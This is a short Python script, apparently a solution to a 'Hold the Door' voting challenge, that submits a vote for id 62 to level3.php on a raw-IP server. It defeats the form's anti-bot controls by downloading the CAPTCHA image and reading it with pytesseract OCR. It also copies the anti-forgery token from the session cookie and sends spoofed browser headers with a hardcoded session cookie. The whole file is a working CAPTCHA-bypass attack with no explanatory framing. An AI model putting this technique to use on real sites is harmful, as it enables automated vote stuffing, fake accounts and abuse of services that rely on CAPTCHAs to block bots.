#!/usr/bin/python3
import requests
import shutil
from PIL import Image
import pytesseract
from time import sleep

headers = {\
        'Host': "54.221.6.249", \
        'User-Agent': "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:51.0) Gecko/20100101 Firefox/51.0", \
        'Accept': "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", \
        'Accept-Language': "en-US,en;q=0.5", \
        'Referer': "http://54.221.6.249/level3.php", \
        'Cookie': "PHPSESSID=448qvkqgi0llp0rcq24vkvkfs0; HoldTheDoor=fdbbcf4d5e84d891b52f844651ea62d47f12cb86", \
        'Connection': "keep-alive", \
        'Upgrade-Insecure-Requests': "1"}

post_data = {\
        'id': 62, \
        'holdthedoor': "Submit", \
        'key': "0", \
        'captcha': "0"}

URL = "http://54.221.6.249/level3.php"

def captcha(cookies):
    r = requests.get("http://54.221.6.249/captcha.php", cookies=cookies, stream=True)
    if r.status_code == 200:
        with open("file", 'wb') as f:
            r.raw.decode_content = True
            shutil.copyfileobj(r.raw, f)
    im = Image.open("file")
    im = im.convert("RGBA")
    im.save("tmp2.jpeg")
    return(pytesseract.image_to_string(Image.open("tmp2.jpeg")))

r = requests.get(URL)
cookies = r.cookies
post_data['captcha'] = captcha(cookies)
post_data['key'] = cookies['HoldTheDoor']
r = requests.post(URL, data=post_data, headers=headers, cookies=cookies)
#r = requests.get(URL)
